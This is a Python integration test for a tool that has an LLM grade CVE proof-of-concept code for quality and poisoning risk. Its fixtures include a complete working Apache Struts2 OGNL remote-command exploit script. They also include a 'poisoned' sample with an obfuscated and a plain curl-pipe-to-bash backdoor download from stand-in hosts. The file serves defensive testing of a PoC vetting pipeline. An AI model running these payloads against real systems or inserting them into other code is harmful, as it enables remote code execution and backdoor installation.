#!/usr/bin/env python3
"""
GPTAnalyzer 集成测试

测试完整的分析流程，验证所有功能
"""

import os
import sys
import logging

# 添加项目根目录到Python路径
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from libs.gpt_analyzer import GPTAnalyzer

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


def print_header(title):
    """打印美化的标题"""
    print("\n" + "="*80)
    print(f"  {title}")
    print("="*80 + "\n")


def print_section(title):
    """打印章节标题"""
    print("\n" + "-"*80)
    print(f"  {title}")
    print("-"*80)


def test_case_1_high_quality_poc():
    """测试用例1: 高质量POC - 应该通过质量检查"""

    print_header("测试用例 1: 高质量POC (应该通过)")

    cve_info = {
        'id': 'CVE-2024-12345',
        'summary': 'Apache Struts2 远程代码执行漏洞，允许攻击者通过构造恶意OGNL表达式执行任意代码',
        'cvss': '9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)'
    }

    search_results = [
        {
            'title': 'Apache Struts2 CVE-2024-12345 漏洞分析',
            'content': 'Struts2 2.0.0-2.5.30版本存在OGNL表达式注入漏洞，攻击者可通过Content-Type头部注入恶意代码',
            'url': 'https://security.apache.org/cve-2024-12345'
        },
        {
            'title': 'CVE-2024-12345 PoC公开',
            'content': '已有完整可用的PoC代码发布，包含详细的利用步骤和防御建议',
            'url': 'https://github.com/example/cve-2024-12345'
        }
    ]

    poc_code = """
# Apache Struts2 CVE-2024-12345 远程代码执行 PoC

import requests
import argparse

def exploit(target_url, command):
    '''
    利用 Struts2 OGNL 表达式注入执行任意命令

    参数:
        target_url: 目标URL
        command: 要执行的命令
    '''
    # 构造恶意OGNL表达式
    payload = f"%{{(#_='multipart/form-data')." \\
              f"(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." \\
              f"(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." \\
              f"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))." \\
              f"(#ognlUtil.getExcludedPackageNames().clear())." \\
              f"(#ognlUtil.getExcludedClasses().clear())." \\
              f"(#context.setMemberAccess(#dm))))." \\
              f"(#cmd='{command}')." \\
              f"(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))." \\
              f"(#cmds=(#iswin?{{'cmd.exe','/c',#cmd}}:{{'/bin/bash','-c',#cmd}}))." \\
              f"(#p=new java.lang.ProcessBuilder(#cmds))." \\
              f"(#p.redirectErrorStream(true))." \\
              f"(#process=#p.start())." \\
              f"(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))." \\
              f"(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))." \\
              f"(#ros.flush())}}"

    headers = {
        'Content-Type': payload
    }

    try:
        response = requests.post(target_url, headers=headers, timeout=10)
        return response.text
    except Exception as e:
        return f"Exploit failed: {str(e)}"

def main():
    parser = argparse.ArgumentParser(description='CVE-2024-12345 PoC')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-c', '--command', default='whoami', help='Command to execute')
    args = parser.parse_args()

    print(f"[*] Target: {args.url}")
    print(f"[*] Command: {args.command}")
    print("[*] Exploiting...")

    result = exploit(args.url, args.command)
    print(f"\\n[+] Result:\\n{result}")

if __name__ == '__main__':
    main()

# 使用示例:
# python exploit.py -u http://target.com:8080/struts2-showcase -c "whoami"
"""

    return cve_info, search_results, poc_code


def test_case_2_low_quality_poc():
    """测试用例2: 低质量POC - 应该不通过质量检查"""

    print_header("测试用例 2: 低质量POC (应该被拒绝)")

    cve_info = {
        'id': 'CVE-2024-00000',  # 无效CVE编号
        'summary': '某未知应用漏洞',
        'cvss': 'N/A'
    }

    search_results = []

    poc_code = """
# CVE-2024-00000 PoC

Just a README file, no actual code.
"""

    return cve_info, search_results, poc_code


def test_case_3_high_poison_risk():
    """测试用例3: 高投毒风险POC - 应该被质量检查拒绝"""

    print_header("测试用例 3: 高投毒风险POC (应该被拒绝)")

    cve_info = {
        'id': 'CVE-2024-99999',  # 无效CVE编号
        'summary': 'Suspicious malware disguised as PoC',
        'cvss': '10.0'
    }

    search_results = []

    poc_code = """
# Suspicious PoC with obfuscated code

import base64
import os

# 高度混淆的代码
exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImN1cmwgaHR0cDovL2V2aWwuY29tL2JhY2tkb29yIHwgYmFzaCIp'))

# 下载并执行外部脚本
os.system("curl http://malicious-site.com/backdoor.sh | bash")
"""

    return cve_info, search_results, poc_code


def run_test(test_name, cve_info, search_results, poc_code):
    """运行单个测试用例"""

    try:
        analyzer = GPTAnalyzer()

        print(f"📊 输入数据:")
        print(f"  CVE ID: {cve_info.get('id')}")
        print(f"  CVE Summary: {cve_info.get('summary', '')[:100]}...")
        print(f"  Search Results: {len(search_results)} 条")
        print(f"  PoC Code: {len(poc_code)} 字符")

        print(f"\n🔄 开始分析...")
        result = analyzer.analyze(cve_info, search_results, poc_code)

        print_section("分析结果")

        if result['success']:
            print(f"✅ 分析成功")

            # 显示字段完整性
            data = result['data']
            missing_fields = [f for f in GPTAnalyzer.REQUIRED_FIELDS if f not in data]
            print(f"\n📋 字段完整性: {len(data)}/{len(GPTAnalyzer.REQUIRED_FIELDS)} 个字段")
            if missing_fields:
                print(f"  ❌ 缺少字段: {', '.join(missing_fields)}")
            else:
                print(f"  ✅ 所有字段完整")

            # 显示关键字段
            print(f"\n🔑 关键字段:")
            print(f"  CVE ID: {data.get('cve_id', 'N/A')}")
            print(f"  漏洞类型: {data.get('vulnerability_type', 'N/A')}")
            print(f"  影响应用: {data.get('affected_product', 'N/A')}")
            print(f"  POC质量: {data.get('poc_quality', 'N/A')}")
            print(f"  攻击复杂度: {data.get('attack_complexity', 'N/A')}")
            print(f"  投毒风险: {data.get('poisoning_risk', 'N/A')}")

            # 质量检查结果
            print(f"\n✅ 质量检查: {'通过 ✓' if result['pass_quality_check'] else '失败 ✗'}")
            if not result['pass_quality_check']:
                print(f"  失败原因:")
                for reason in result['fail_reasons']:
                    print(f"    - {reason}")

            # 保存Markdown
            output_file = f"test_output_{test_name}.md"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(result['markdown'])
            print(f"\n💾 Markdown已保存: {output_file}")

            return result['pass_quality_check']

        else:
            print(f"❌ 分析失败: {result.get('error', '未知错误')}")
            return False

    except Exception as e:
        print(f"❌ 测试异常: {e}")
        import traceback
        traceback.print_exc()
        return False


def main():
    """主测试函数"""

    print_header("GPTAnalyzer 集成测试")

    # 检查环境变量
    if not os.getenv('GPT_API_KEY'):
        print("❌ 错误: 未设置 GPT_API_KEY 环境变量")
        print("\n请运行:")
        print("  export GPT_API_KEY=\"your-api-key\"")
        print("  export GPT_SERVER_URL=\"https://api.openai.com/v1/chat/completions\"")
        print("  export GPT_MODEL=\"gemini-2.5-flash\"  # 可选")
        return 1

    if not os.getenv('GPT_SERVER_URL'):
        print("❌ 错误: 未设置 GPT_SERVER_URL 环境变量")
        return 1

    print("✅ 环境变量检查通过")
    print(f"  GPT_API_KEY: {'*' * 20}")
    print(f"  GPT_SERVER_URL: {os.getenv('GPT_SERVER_URL')}")
    print(f"  GPT_MODEL: {os.getenv('GPT_MODEL', 'gemini-2.5-flash')}")

    # 运行测试用例
    results = {}

    # 测试用例1: 高质量POC
    cve_info, search_results, poc_code = test_case_1_high_quality_poc()
    results['test1_high_quality'] = run_test('test1_high_quality', cve_info, search_results, poc_code)

    # 测试用例2: 低质量POC
    cve_info, search_results, poc_code = test_case_2_low_quality_poc()
    results['test2_low_quality'] = run_test('test2_low_quality', cve_info, search_results, poc_code)

    # 测试用例3: 高投毒风险
    cve_info, search_results, poc_code = test_case_3_high_poison_risk()
    results['test3_high_poison'] = run_test('test3_high_poison', cve_info, search_results, poc_code)

    # 汇总结果
    print_header("测试总结")

    print("📊 测试结果:")
    passed = sum(1 for v in results.values() if v is not None)
    total = len(results)
    print(f"  总计: {total} 个测试")
    print(f"  完成: {passed} 个")

    print("\n📋 详细结果:")
    expected_results = {
        'test1_high_quality': True,   # 高质量POC应该通过
        'test2_low_quality': False,   # 低质量POC应该失败
        'test3_high_poison': False,   # 高投毒风险应该失败
    }

    all_passed = True
    for test_name, result in results.items():
        expected = expected_results.get(test_name)
        status = "✅" if result == expected else "❌"
        print(f"  {status} {test_name}: {result} (预期: {expected})")
        if result != expected:
            all_passed = False

    print("\n" + "="*80)
    if all_passed:
        print("✅ 所有测试通过！")
        return 0
    else:
        print("❌ 部分测试失败")
        return 1


if __name__ == '__main__':
    sys.exit(main())
